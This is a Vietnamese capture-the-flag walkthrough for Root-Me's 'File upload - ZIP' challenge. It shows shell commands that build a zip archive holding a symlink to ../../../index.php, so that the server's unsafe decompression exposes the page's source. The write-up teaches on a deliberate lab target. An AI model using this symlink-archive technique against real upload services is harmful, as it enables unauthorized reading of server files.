<main class="main" role="main">
    <div class="content">
        <article id="post-fileupload/fileupload_chal4" class="article article-type-post" itemscope="" itemtype="http://schema.org/BlogPosting">
            <div class="article-header">
                <h1 class="article-title" itemprop="name">
                    File upload - ZIP
                </h1>
                <div class="article-meta"><a href="?page=<?php echo $parent; ?>"><span>Back To Home</span></a>
               </div>
            </div>
            <div class="article-entry marked-body" itemprop="articleBody">
                <h1 id="Thu-Thach"><a href="#Thu-Thach" class="headerlink" title="Thử Thách"></a>Thử Thách</h1>
                <p>URL: <a href="https://www.root-me.org/en/Challenges/Web-Server/File-upload-ZIP" target="_blank" rel="noopener">https://www.root-me.org/en/Challenges/Web-Server/File-upload-ZIP</a></p>
                <h2 id="Tieu-de"><a href="#Tieu-de" class="headerlink" title="Tiêu đề"></a>Tiêu đề</h2>
                <p>Unsafe decompression</p>
                <h2 id="Mo-ta"><a href="#Mo-ta" class="headerlink" title="Mô tả"></a>Mô tả</h2>
                <p>Your goal is to read index.php file.</p>
                <button id="read-writeup"><span><img src="public/images/more.png" /></span>Xem Hướng Dẫn</button>
                <p style="color: red; margin-left: 10px; font-weight: bold">Hãy cố gắng tự làm bằng hết sức mình trước, xem hướng dẫn ngay từ đầu thì bạn sẽ mất nhiều thứ đó..</p>
                <script type="text/javascript">
                    $(document).ready(function(){
                        $("#read-writeup").click(function(){
                            $("#w-content").toggle();
                        });
                    });
                </script>
                <div id="w-content" style="display: none">
                <h1 id="Huong-Dan"><a href="#Huong-Dan" class="headerlink" title="Hướng Dẫn"></a>Hướng Dẫn</h1>
                <p>Mục tiêu của bài này là đọc file index.php, khác với những bài trước là có thể upload file php.</p>
                <p>Thử upload file zip có shell là đuôi .php lên thì vẫn thành công, nhưng lại không được cấp quyền để truy cập: <strong>403</strong></p>
                <p>Để làm được bài này, ta sử dụng một trick mà mình đã nói trong phần cung cấp kiến thức,đó là dùng symlink.</p>
                <h2 id="Cach-dung-symlink"><a href="#Cach-dung-symlink" class="headerlink" title="Cách dùng symlink"></a>Cách dùng symlink</h2>
                <p><strong> CẦN MÁY LINUX / UBUNTU </strong></p>
                <p>Đầu tiên, ta tạo 1 file index.php (Trùng với tên file ta muốn đọc) tại thư mục gốc nào đó:<br></p>
                <figure class="highlight bash">
                    <table>
                        <tbody>
                        <tr>
                            <td class="gutter">
                                <pre><span class="line">1</span><br><span class="line">2</span><br></pre>
                            </td>
                            <td class="code">
                                <pre><span class="line"><span class="built_in">cd</span> ~/Desktop</span><br><span class="line"><span class="built_in">echo</span> <span class="string">''</span> &gt; index.php</span><br></pre>
                            </td>
                        </tr>
                        </tbody>
                    </table>
                </figure>
                <p></p>
                <p>Thử upload 1 file zip lên, ta thấy nội dung được giải nén ra nằm ở vị trí:</p>
                <blockquote>
                    <p>/web-serveur/ch51/tmp/upload/5bf8c81a1fd778.75120184/abc.txt</p>
                </blockquote>
                <p>Vị trí của index trong này là /web-serveur/ch51/index.php<br>Ta tạo các thư mục cho đúng bậc của file abc.txt như sau:<br></p>
                <figure class="highlight bash">
                    <table>
                        <tbody>
                        <tr>
                            <td class="gutter">
                                <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre>
                            </td>
                            <td class="code">
                                <pre><span class="line">mkdir tmp</span><br><span class="line"><span class="built_in">cd</span> tmp &amp;&amp; mkdir upload</span><br><span class="line"><span class="built_in">cd</span> upload &amp;&amp; mkdir cookie</span><br><span class="line"><span class="built_in">cd</span> cookie &amp;&amp; <span class="built_in">echo</span> <span class="string">''</span> &gt; abc.txt</span><br></pre>
                            </td>
                        </tr>
                        </tbody>
                    </table>
                </figure>
                <p></p>
                <p>Từ đây, ta tạo một symlink giữa file abc.txt tới file index.php<br></p>
                <figure class="highlight plain">
                    <table>
                        <tbody>
                        <tr>
                            <td class="gutter">
                                <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre>
                            </td>
                            <td class="code">
                                <pre><span class="line"># Đang ở thư mục cookie</span><br><span class="line">ln -s ../../../index.php abc.txt</span><br><span class="line"></span><br><span class="line"># Nén lại</span><br><span class="line">zip -y -r zipfile.zip abc.txt</span><br></pre>
                            </td>
                        </tr>
                        </tbody>
                    </table>
                </figure>
                <p></p>
                <h2 id="Upload-len-va-mo-file-abc-txt-ra-thi-se-thay-magic"><a href="#Upload-len-va-mo-file-abc-txt-ra-thi-se-thay-magic" class="headerlink" title="Upload lên và mở file abc.txt ra thì sẽ thấy magic."></a>Upload lên và mở file abc.txt ra thì sẽ thấy magic.</h2>
                <p>Vì file abc.txt vẫn lưu symlink tới ../../../index.php nên ta sẽ đọc được source file index.php trong trường hợp này.</p>
                <h1 id="Tham-Khao-Them"><a href="#Tham-Khao-Them" class="headerlink" title="Tham Khảo Thêm"></a>Tham Khảo Thêm</h1>
                <ul>
                    <li><strong>Symbolic Link</strong>: <a href="https://en.wikipedia.org/wiki/Symbolic_link" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Symbolic_link</a></li>
                </ul>
                </div></div>
        </article>
        <section id="comments">
            <div id="vcomments"></div>
        </section>
    </div>

</main>